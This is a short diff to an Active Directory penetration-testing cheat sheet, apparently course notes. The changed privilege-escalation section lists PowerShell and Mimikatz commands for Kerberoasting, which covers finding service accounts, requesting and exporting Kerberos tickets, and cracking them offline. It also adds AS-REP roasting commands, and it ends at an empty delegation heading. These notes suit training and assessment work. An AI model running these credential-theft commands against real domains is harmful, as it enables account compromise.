@@ -88,15 +88,24 @@ Invoke-Userhunter -CheckAccess : To confirm admin access
  
 ## Privilege Escalation 
 
-- Kerberos
+### Kerberos
   
--     Find User Account Used as Service Account
--          Get-NetUser -SPN
--     Requesting a TGS
--          Add-Type -AssemblyName System.IdentityModel 
--          New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName"
--     Export all ticket using Mimikatz
--          Invoke-Mimikatz -Command '"kerberos::list /export"'
--     Cracking the hash using john or hashcat
+- Find User Account Used as Service Account
+-      Get-NetUser -SPN
+- Requesting a TGS
+-      Add-Type -AssemblyName System.IdentityModel 
+-      New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName"
+- Export all ticket using Mimikatz
+-      Invoke-Mimikatz -Command '"kerberos::list /export"'
+- Cracking the hash using john or hashcat
   
-- AsRep Roasting
+### AS-REP Roasting
+
+- Enumerating Account with Preauth Disabled
+-    Get-DomainUser -PreauthNotRequired -Verbose
+- Requesting Encrypted AS-REP for offline brueforcing
+-    Get-ASRepHash -Username studentx -verbose
+  
+### Unconstrained Dlegation
+  
+
